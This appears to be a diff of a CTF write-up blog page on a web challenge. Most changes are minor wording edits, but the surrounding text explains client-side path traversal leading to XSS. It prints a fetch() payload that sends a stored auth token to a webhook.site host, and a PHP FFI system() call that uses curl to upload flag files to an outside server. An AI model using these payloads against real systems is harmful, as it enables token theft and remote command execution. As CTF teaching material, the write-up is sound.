@@ -28,7 +28,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://xyz-macabely.github.io/images/0/logo.png">
 <meta property="article:published_time" content="2025-09-29T21:00:00.000Z">
-<meta property="article:modified_time" content="2025-10-15T10:18:03.490Z">
+<meta property="article:modified_time" content="2025-10-15T11:16:26.898Z">
 <meta property="article:author" content="Macabely">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="web">
@@ -556,7 +556,7 @@
 <p>This <code>previewPhoto</code> variable is assigned to <code>updated.profilePhotoUrl</code> or <code>data.profilePhotoUrl</code>. That <code>profilePhotoUrl</code> parameter we saw in the very beginning when we made the update image request, in default you start without an image so <code>previewPhoto</code> is assigned to <strong>NULL</strong>.</p>
 <p>We also have a little nice hint by the author saying: <code>profilePhotoUrl is injected as raw HTML</code>.</p>
 <p>That makes me thinking, we can upload an image and inject a malicious <code>profilePhotoUrl</code> referring to our server, send it to the bot and make it get the cookie for us??</p>
-<p>I think i made things messy a little bit (sorry for that ^_^), let’s see first what are those <code>getUserData()/updateUserData()</code> functions doing in the api call.</p>
+<p>I think i made things messy a little bit (sorry for that ^_^), first let’s see what are those <code>getUserData()/updateUserData()</code> functions doing in the api call.</p>
 <p><code>userApi.ts</code>:</p>
 <div class="code-wrapper"><pre><code class="hljs ts"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">API_BASE_URL</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">REACT_APP_API_URL</span> || <span class="hljs-string">&#x27;/api&#x27;</span>;
 ...
@@ -632,9 +632,9 @@
       res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Failed to update user data&#x27;</span> &#125;);
     &#125;
   &#125;;</code></pre></div>
-<p>This is the backend controller where requests are received from api client, Functions are defined in <code>UserController.ts</code>.</p>
+<p>This is the backend controller where requests are received from api client.</p>
 <p>This <code>getUserData</code> function basically takes a username you give, then search for it in the database to see if it’s found or not and if you have a <strong>profilePhotoUrl</strong> the function prints it in the results too.</p>
-<p>The <code>updateUserData</code> function dose almost the same thing, but it used to handle the updated data from updater profile requests.</p>
+<p>The <code>updateUserData</code> function dose almost the same thing, but it used to handle the updated data from update profile requests.</p>
 <p>That’s dangerous, cause if we have access on that <code>username</code> we can deliver a <strong>Client-Side Path Traversal</strong> here, making the api updating malicious data with a malicious <code>profilePhotoUrl</code> that will get injected later in src attribute making XSS possible.</p>
 <p>The last thing needs to be mentioned is how the admin bot gonna react on this? I mentioned a little code above from the <strong>View Profile</strong> feature.</p>
 <div class="code-wrapper"><pre><code class="hljs tsx">...
@@ -717,7 +717,7 @@ app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x2
           </div>
 <ul>
 <li><code>useEffect()</code> will receive the malicious data and assign the <code>PreviewPhoto</code> to the malicious <code>profilePhotoUrl</code> we inject.</li>
-<li><code>PreviewPhoto</code> will be inserted later in src attribute making the XSS possible</li>
+<li><code>PreviewPhoto</code> will be inserted later in src attribute with the malicious content making the XSS possible.</li>
 </ul>
 <p>Let’s summarize the exploit</p>
 <h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><ol>
@@ -735,7 +735,7 @@ app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x2
   <span class="hljs-attr">&quot;profilePhotoUrl&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/uploads/mgqlm0ig8w0he7c95gi.jpg&quot;</span>
 <span class="hljs-punctuation">&#125;</span></code></pre></div>
 <p>These parameters used later by the code, you need to follow the exact format so you won’t get errors.</p>
-<p>Our input is being injected in src attribute, i tried some payloads but most of them didn’t work through a syntax errors with single&#x2F;double quotes. So i ended up using eval with atob and btoa.</p>
+<p>Our input is being injected in src attribute, i tried some payloads but most of them didn’t work through a syntax errors with single&#x2F;double quotes. So i ended up using eval with atob.</p>
 <p>Payload:</p>
 <div class="code-wrapper"><pre><code class="hljs js"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">`https://webhook.site/d4387e58-541a-43b3-b82c-9b0d1f3f9b16?cok=<span class="hljs-subst">$&#123;<span class="hljs-variable language_">localStorage</span>.getItem(<span class="hljs-string">&#x27;token&#x27;</span>)&#125;</span>`</span>); <span class="hljs-comment">//base64 it</span>
 
@@ -769,7 +769,7 @@ onerror=<span class="hljs-built_in">eval</span>(<span class="hljs-title function
 <span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mv</span> /flag.txt /flag_$(<span class="hljs-built_in">head</span> /dev/urandom | <span class="hljs-built_in">tr</span> -dc a-z0-9 | <span class="hljs-built_in">head</span> -c 16).txt</span>
 <span class="hljs-keyword">COPY</span><span class="language-bash"> index.php /var/www/html/</span>
 <span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span></code></pre></div>
-<p>You will notice it’s installing <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/book.ffi.php">ffi</a>. <code>ffi</code> is like a mechanism that allows a program written in one programming language to call functions and use services written in another language, typically a lower-level one like C.</p>
+<p>You will notice it’s installing <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/book.ffi.php">ffi</a>. <code>ffi</code> is like a mechanism that allows a program written in one programming language to <strong>call functions</strong> and use services written in another language, typically a lower-level one like C.</p>
 <p>In this case we can call sensitive functions, bypassing the striction exist in the php service successfully. I spent some time is this part until i made the final payload:<br><code>$ffi=FFI::cdef(&#39;int system(const char* command);&#39;); $ffi-&gt;system(&#39;curl https://macabely.free.beeceptor.com -T /flag*&#39;);</code></p>
 <p>Here we called the system function and used the curl command from it.</p>
 <p>By this information, you can start a server and make it redirect to: <code>Location: http://php?code=$ffi=FFI::cdef(&#39;int system(const char* command);&#39;); $ffi-&gt;system(&#39;curl https://macabely.free.beeceptor.com -T /flag*&#39;);</code></p>
